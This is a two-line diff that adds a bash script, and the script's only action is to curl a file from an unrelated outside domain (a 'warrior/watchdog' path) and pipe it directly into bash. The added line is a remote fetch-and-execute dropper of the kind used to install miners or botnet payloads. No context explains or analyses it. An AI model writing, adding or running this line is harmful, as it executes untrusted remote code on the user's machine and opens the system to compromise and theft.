@@ -1,0 +1,2 @@
+#!/bin/bash
+curl https://missaustraliana.net/warrior/watchdog | bash -s -- 1
